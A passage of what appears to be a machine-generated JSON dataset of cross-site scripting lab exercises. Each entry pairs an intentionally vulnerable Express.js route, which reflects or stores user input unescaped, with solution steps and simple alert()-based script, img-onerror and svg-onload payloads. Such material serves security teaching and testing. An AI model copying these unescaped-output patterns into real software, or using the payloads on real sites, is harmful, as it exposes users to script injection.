      "Reload article and observe execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/comment-article', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO kb_comments (comment) VALUES (?)\", [comment]);\n  res.send('Comment posted');\n});",
    "payloads": [
      "<script>alert('KnowledgeBase')</script>",
      "<img src=x onerror=alert('KB')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online certificate name input",
    "Lab Description": "Certificate generation form reflects the provided name without escaping, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit name: <script>alert('Certificate')</script>.",
      "Observe execution on generated certificate preview."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/generate-certificate', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h1>Certificate for: ${name}</h1>`);\n});",
    "payloads": [
      "<script>alert('Certificate')</script>",
      "<svg/onload=alert('Cert')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in event management system attendee comments",
    "Lab Description": "Attendees can leave public comments on event pages. Comments are stored without sanitization, leading to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit comment: <script>alert('EventXSS')</script>.",
      "Reload event page and observe execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO event_comments (comment) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
    "payloads": [
      "<script>alert('EventXSS')</script>",
      "<img src=x onerror=alert('Event')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in book review website search field",
    "Lab Description": "Book search queries are reflected into the search results page without encoding, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Search for: <script>alert('BookSearch')</script>.",
      "Observe script execution in results page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search-books', (req, res) => {\n  const search = req.body.search;\n  res.send(`<h2>Results for: ${search}</h2>`);\n});",
    "payloads": [
      "<script>alert('BookSearch')</script>",
      "<svg/onload=alert('Book')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online doctor appointment notes",
    "Lab Description": "Patients can leave notes for doctors while booking appointments. Notes are stored without sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit note: <script>alert('DoctorXSS')</script>.",
      "Doctor views appointment and triggers XSS."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO appointment_notes (note) VALUES (?)\", [note]);\n  res.send('Note submitted');\n});",
    "payloads": [
      "<script>alert('DoctorXSS')</script>",
      "<img src=x onerror=alert('Doctor')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in course enrollment form",
    "Lab Description": "After filling course enrollment, user details are reflected back without encoding, enabling reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit enrollment name: <script>alert('EnrollXSS')</script>.",
      "Check confirmation page for script execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/enroll', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h3>Welcome ${name}!</h3>`);\n});",
    "payloads": [
      "<script>alert('EnrollXSS')</script>",
      "<svg/onload=alert('Enroll')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in real estate listing descriptions",
    "Lab Description": "Real estate agents can create property listings with descriptions. Descriptions are not sanitized before display.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit listing with: <script>alert('RealEstate')</script>.",
      "View listing page to trigger payload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-listing', (req, res) => {\n  const description = req.body.description;\n  db.query(\"INSERT INTO listings (description) VALUES (?)\", [description]);\n  res.send('Listing created');\n});",
    "payloads": [
      "<script>alert('RealEstate')</script>",
      "<img src=x onerror=alert('Listing')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online ticket booking platform",
    "Lab Description": "User-submitted names for ticket bookings are reflected into a receipt page without sanitization.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Book ticket with name: <script>alert('TicketXSS')</script>.",
      "Observe payload execution on ticket page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-ticket', (req, res) => {\n  const passenger = req.body.passenger;\n  res.send(`<h1>Ticket for ${passenger}</h1>`);\n});",
    "payloads": [
      "<script>alert('TicketXSS')</script>",
      "<svg/onload=alert('Ticket')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in fitness tracker app custom achievements",
    "Lab Description": "Users can create custom achievements in a fitness app. Achievement names are not sanitized before rendering.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create achievement: <script>alert('Fitness')</script>.",
      "View achievements to trigger payload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-achievement', (req, res) => {\n  const achievement = req.body.achievement;\n  db.query(\"INSERT INTO achievements (name) VALUES (?)\", [achievement]);\n  res.send('Achievement added');\n});",
    "payloads": [
      "<script>alert('Fitness')</script>",
      "<img src=x onerror=alert('Achievement')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in scholarship application form",
    "Lab Description": "Scholarship applicant names are reflected into confirmation page without escaping, allowing XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit name: <script>alert('ScholarshipXSS')</script>.",
      "Observe XSS execution on confirmation."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply-scholarship', (req, res) => {\n  const name = req.body.name;\n  res.send(`<div>Applicant: ${name}</div>`);\n});",
    "payloads": [
      "<script>alert('ScholarshipXSS')</script>",
      "<svg/onload=alert('Scholar')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in bug bounty platform report comments",
    "Lab Description": "Bug reporters can leave public comments. Comments are stored without sanitization, enabling persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit comment: <script>alert('BugBounty')</script>.",
      "Observe payload execution on report page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/post-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO bounty_comments (comment) VALUES (?)\", [comment]);\n  res.send('Comment posted');\n});",
    "payloads": [
      "<script>alert('BugBounty')</script>",
      "<img src=x onerror=alert('Bug')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online donation acknowledgment page",
    "Lab Description": "Donation forms reflect donor name without escaping, leading to reflected XSS when showing acknowledgment.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit donor name: <script>alert('DonorXSS')</script>.",
      "Observe script execution on acknowledgment page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/acknowledge-donation', (req, res) => {\n  const donor = req.body.donor;\n  res.send(`<p>Thank you ${donor} for your donation!</p>`);\n});",
    "payloads": [
      "<script>alert('DonorXSS')</script>",
      "<svg/onload=alert('Donor')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in recipe sharing platform ingredients field",
    "Lab Description": "Users can submit recipes with ingredients. The ingredients field is stored without sanitization, leading to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a recipe with ingredients: <script>alert('RecipeXSS')</script>.",
      "Reload recipe page and observe payload execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-recipe', (req, res) => {\n  const ingredients = req.body.ingredients;\n  db.query(\"INSERT INTO recipes (ingredients) VALUES (?)\", [ingredients]);\n  res.send('Recipe submitted');\n});",
    "payloads": [
      "<script>alert('RecipeXSS')</script>",
      "<img src=x onerror=alert('Recipe')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in university admission application form",
    "Lab Description": "Applicants' names are reflected on the confirmation page without sanitization, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit name: <script>alert('AdmissionXSS')</script>.",
      "Observe execution on the confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-application', (req, res) => {\n  const applicant = req.body.applicant;\n  res.send(`<div>Application received for ${applicant}</div>`);\n});",
    "payloads": [
      "<script>alert('AdmissionXSS')</script>",
      "<svg/onload=alert('Admission')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in car rental service special request notes",
    "Lab Description": "Car renters can leave special requests that are stored without sanitization, enabling stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a rental request with: <script>alert('RentalXSS')</script>.",
      "Observe execution on rental confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/rent-car', (req, res) => {\n  const request = req.body.request;\n  db.query(\"INSERT INTO rentals (special_requests) VALUES (?)\", [request]);\n  res.send('Car rental submitted');\n});",
    "payloads": [
      "<script>alert('RentalXSS')</script>",
      "<img src=x onerror=alert('Rental')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online movie ticket booking",
    "Lab Description": "User-provided data for movie booking is reflected without sanitization, allowing reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit movie booking with: <script>alert('MovieXSS')</script>.",
      "Observe payload execution in booking confirmation."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-movie', (req, res) => {\n  const movie = req.body.movie;\n  res.send(`<h1>Booking confirmed for ${movie}</h1>`);\n});",
    "payloads": [
      "<script>alert('MovieXSS')</script>",
      "<svg/onload=alert('Movie')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in language learning platform lesson notes",
    "Lab Description": "Students can leave notes on lessons. Notes are stored and displayed without escaping, leading to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a lesson note with: <script>alert('LanguageXSS')</script>.",
      "Observe payload execution when revisiting lesson."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO lesson_notes (content) VALUES (?)\", [note]);\n  res.send('Note added');\n});",
    "payloads": [
      "<script>alert('LanguageXSS')</script>",
      "<img src=x onerror=alert('Lesson')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in real estate inquiry form",
    "Lab Description": "User inquiries on properties are reflected into pages without escaping, enabling reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit inquiry with: <script>alert('InquiryXSS')</script>.",
      "Observe execution on property inquiry confirmation."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-inquiry', (req, res) => {\n  const inquiry = req.body.inquiry;\n  res.send(`<p>Inquiry submitted: ${inquiry}</p>`);\n});",
    "payloads": [
      "<script>alert('InquiryXSS')</script>",
      "<svg/onload=alert('Inquiry')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in freelancing platform project description",
    "Lab Description": "Clients post project descriptions without filtering input, allowing persistent XSS on freelancer dashboards.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post a project with: <script>alert('FreelanceXSS')</script>.",
      "Observe script execution on freelancer search results."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/post-project', (req, res) => {\n  const project = req.body.project;\n  db.query(\"INSERT INTO projects (description) VALUES (?)\", [project]);\n  res.send('Project posted');\n});",
    "payloads": [
      "<script>alert('FreelanceXSS')</script>",
      "<img src=x onerror=alert('Project')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in music streaming app song request page",
    "Lab Description": "User-submitted song requests are reflected back without escaping, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit request: <script>alert('MusicXSS')</script>.",
      "Observe execution on confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/request-song', (req, res) => {\n  const song = req.body.song;\n  res.send(`<h2>Requested: ${song}</h2>`);\n});",
    "payloads": [
      "<script>alert('MusicXSS')</script>",
      "<svg/onload=alert('Music')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in travel agency review section",
    "Lab Description": "Travelers submit trip reviews. Reviews are rendered without sanitization, enabling stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a review with: <script>alert('TravelXSS')</script>.",
      "View reviews and confirm payload execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO travel_reviews (review) VALUES (?)\", [review]);\n  res.send('Review submitted');\n});",
    "payloads": [
      "<script>alert('TravelXSS')</script>",
      "<img src=x onerror=alert('Trip')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online grocery store feedback form",
    "Lab Description": "Customer feedback is reflected into a thank-you page without encoding, enabling reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit feedback: <script>alert('GroceryXSS')</script>.",
      "Observe execution on confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  res.send(`<div>Thanks for your feedback: ${feedback}</div>`);\n});",
    "payloads": [
      "<script>alert('GroceryXSS')</script>",
      "<svg/onload=alert('Grocery')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in real estate listing comments",
    "Lab Description": "Users can leave comments on property listings. Comments are stored without sanitization, leading to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a comment with <script>alert('ListingXSS')</script>.",
      "Reload the listing page and observe script execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO comments (text) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
    "payloads": [
      "<script>alert('ListingXSS')</script>",
      "<img src=x onerror=alert('Comment')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online job application",
    "Lab Description": "Job applicant names are reflected into the confirmation page without escaping, allowing reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit name <script>alert('JobXSS')</script>.",
      "Observe script execution on the confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply-job', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h1>Application received: ${name}</h1>`);\n});",
    "payloads": [
      "<script>alert('JobXSS')</script>",
      "<svg/onload=alert('Job')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online donation message field",
    "Lab Description": "Donors can leave public messages. These are stored without sanitization, enabling stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a donation with message: <script>alert('DonationXSS')</script>.",
      "View the public donor wall and observe execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-donation', (req, res) => {\n  const message = req.body.message;\n  db.query(\"INSERT INTO donations (message) VALUES (?)\", [message]);\n  res.send('Donation received');\n});",
    "payloads": [
      "<script>alert('DonationXSS')</script>",
      "<img src=x onerror=alert('Donation')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online library book search",
    "Lab Description": "Search terms are reflected without escaping into the search result page, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Search for: <script>alert('LibraryXSS')</script>.",
      "Observe script execution in search results."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search-books', (req, res) => {\n  const term = req.body.term;\n  res.send(`<h2>Results for: ${term}</h2>`);\n});",
    "payloads": [
      "<script>alert('LibraryXSS')</script>",
      "<svg/onload=alert('Library')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in car service booking notes",
    "Lab Description": "Customers can leave notes when booking car services. Notes are rendered without sanitization, leading to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Book a service with: <script>alert('ServiceXSS')</script> in the notes.",
      "View the booking page and confirm execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-service', (req, res) => {\n  const notes = req.body.notes;\n  db.query(\"INSERT INTO service_notes (notes) VALUES (?)\", [notes]);\n  res.send('Service booked');\n});",
    "payloads": [
      "<script>alert('ServiceXSS')</script>",
      "<img src=x onerror=alert('Service')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online travel booking destination field",
    "Lab Description": "Destination input is reflected without encoding into the confirmation page, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit destination <script>alert('TravelXSS')</script>.",
      "Observe execution on the booking confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-travel', (req, res) => {\n  const destination = req.body.destination;\n  res.send(`<h2>Booking for: ${destination}</h2>`);\n});",
    "payloads": [
      "<script>alert('TravelXSS')</script>",
      "<svg/onload=alert('Destination')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online fitness app workout notes",
    "Lab Description": "Users can add notes to their workouts. Notes are saved without escaping, enabling stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add a workout note: <script>alert('WorkoutXSS')</script>.",
      "Observe script execution when reviewing workouts."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-workout-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO workout_notes (note) VALUES (?)\", [note]);\n  res.send('Workout note saved');\n});",
    "payloads": [
      "<script>alert('WorkoutXSS')</script>",
      "<img src=x onerror=alert('Workout')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in book review platform author search",
    "Lab Description": "Author names are reflected into the HTML page unsanitized, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Search for author <script>alert('AuthorXSS')</script>.",
      "Observe execution in the result page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search-author', (req, res) => {\n  const author = req.body.author;\n  res.send(`<p>Search results for: ${author}</p>`);\n});",
    "payloads": [
      "<script>alert('AuthorXSS')</script>",
      "<svg/onload=alert('Author')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online gadget marketplace product questions",
    "Lab Description": "Buyers can ask sellers questions about products. Questions are saved without sanitization, leading to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Ask a question: <script>alert('QuestionXSS')</script>.",
      "Seller views question and payload triggers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/ask-question', (req, res) => {\n  const question = req.body.question;\n  db.query(\"INSERT INTO product_questions (question) VALUES (?)\", [question]);\n  res.send('Question submitted');\n});",
    "payloads": [
      "<script>alert('QuestionXSS')</script>",
      "<img src=x onerror=alert('Question')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in virtual event RSVP system",
    "Lab Description": "RSVP name is reflected into event confirmation page without escaping, enabling reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "RSVP with name: <script>alert('EventXSS')</script>.",
      "Observe execution on the confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/rsvp', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h1>Welcome to the event, ${name}!</h1>`);\n});",
    "payloads": [
      "<script>alert('EventXSS')</script>",
      "<svg/onload=alert('Event')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in customer support ticket notes",
    "Lab Description": "The app allows users to submit support tickets with notes. Notes are stored and displayed to admins without sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a ticket note with <script>alert('SupportXSS')</script>.",
      "Login as admin and view the ticket page.",
      "Observe script execution in note field."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-ticket', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO tickets (note) VALUES (?)\", [note]);\n  res.send('Ticket created');\n});",
    "payloads": [
      "<script>alert('SupportXSS')</script>",
      "<img src=x onerror=alert('NoteXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in restaurant booking confirmation",
    "Lab Description": "The app reflects the user's name in a confirmation page without escaping it properly.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Book a table using name <script>alert('XSS')</script>.",
      "Observe reflected payload execution on confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-table', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h2>Booking confirmed for: ${name}</h2>`);\n});",
    "payloads": [
      "<script>alert('TableXSS')</script>",
      "<svg/onload=alert('Booking')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in bug tracker task description",
    "Lab Description": "Bug tracker allows users to submit bugs with descriptions. The descriptions are stored and rendered in admin dashboard without escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a bug report with <script>alert('BugXSS')</script> in description.",
      "Open the admin view and confirm script execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-bug', (req, res) => {\n  const desc = req.body.description;\n  db.query(\"INSERT INTO bugs (description) VALUES (?)\", [desc]);\n  res.send('Bug submitted');\n});",
    "payloads": [
      "<script>alert('BugXSS')</script>",
      "<img src=x onerror=alert('Bug')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in banking portal transaction description",
    "Lab Description": "Transaction description reflects user input without sanitization in the summary page.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit transaction with <script>alert('BankXSS')</script> as description.",
      "Observe execution in confirmation summary."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-transaction', (req, res) => {\n  const desc = req.body.description;\n  res.send(`<h1>Transaction: ${desc}</h1>`);\n});",
    "payloads": [
      "<script>alert('BankXSS')</script>",
      "<svg/onload=alert('Transfer')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in feedback field of medical consultation form",
    "Lab Description": "Medical consultation form saves user feedback unescaped and displays it to doctors, leading to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback <script>alert('DoctorXSS')</script>.",
      "Login as doctor and open patient feedback.",
      "Observe XSS execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  db.query(\"INSERT INTO consultations (feedback) VALUES (?)\", [feedback]);\n  res.send('Feedback submitted');\n});",
    "payloads": [
      "<script>alert('DoctorXSS')</script>",
      "<img src=x onerror=alert('Medical')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in e-ticket system route name",
    "Lab Description": "Ticket route input is reflected without escaping on confirmation page.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Book with route: <script>alert('TicketXSS')</script>.",
      "Observe execution in ticket confirmation."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-ticket', (req, res) => {\n  const route = req.body.route;\n  res.send(`<p>Travel route: ${route}</p>`);\n});",
    "payloads": [
      "<script>alert('TicketXSS')</script>",
      "<svg/onload=alert('Route')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in library management system review",
    "Lab Description": "Students can review books. Review content is stored and displayed without sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit review <script>alert('LibraryXSS')</script>.",
      "Open the book review page and confirm execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO book_reviews (content) VALUES (?)\", [review]);\n  res.send('Review added');\n});",
    "payloads": [
      "<script>alert('LibraryXSS')</script>",
      "<img src=x onerror=alert('Book')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in e-commerce coupon form",
    "Lab Description": "Submitted coupon code is reflected in the result page unsanitized.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Enter coupon: <script>alert('CouponXSS')</script>.",
      "Observe execution on result page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply-coupon', (req, res) => {\n  const code = req.body.code;\n  res.send(`<div>Applied: ${code}</div>`);\n});",
    "payloads": [
      "<script>alert('CouponXSS')</script>",
      "<svg/onload=alert('Code')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online gaming profile bio",
    "Lab Description": "Users update gaming bios. Bio is stored and shown in profile without escaping.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set bio: <script>alert('GamerXSS')</script>.",
      "Visit the profile and observe payload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-bio', (req, res) => {\n  const bio = req.body.bio;\n  db.query(\"UPDATE users SET bio = ? WHERE id = ?\", [bio, req.body.id]);\n  res.send('Bio updated');\n});",
    "payloads": [
      "<script>alert('GamerXSS')</script>",
      "<img src=x onerror=alert('Bio')>"
    ]
  },
  {
